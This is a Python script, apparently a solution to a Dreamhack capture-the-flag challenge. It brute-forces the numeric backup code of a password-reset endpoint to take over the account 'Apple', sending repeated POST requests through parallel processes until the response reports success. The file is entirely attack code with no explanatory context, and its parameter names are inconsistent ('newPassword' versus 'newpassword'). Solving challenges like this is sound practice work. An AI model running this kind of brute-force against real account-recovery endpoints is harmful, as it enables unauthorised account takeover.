import requests,random
from multiprocessing import Process

query='http://host3.dreamhack.games:18218/forgot_password'
def answer(low,high):
    for i in range(low,high):
        data={
            'userid':'Apple',
            'newPassword' : 'Apple',
            'backupCode':i
        }
        response=requests.post(query,data)
        print(i)
        if 'Success' in response.text:
            print(i,"success")
            break
    
if __name__=="__main__":
    th1 = Process(target=answer, args=(0,5))
    th2 = Process(target=answer,args=(5,10))

    th1.start()
    th2.start()

    for i in range(0,100):
        data={
            'userid':'Apple',
            'newpassword' : 'Apple',
            'backupCode':i
        }
        response=requests.post(query,data)
        print(i)
        if 'Password Change Success' in response.text:
            print(i,"success")
            break
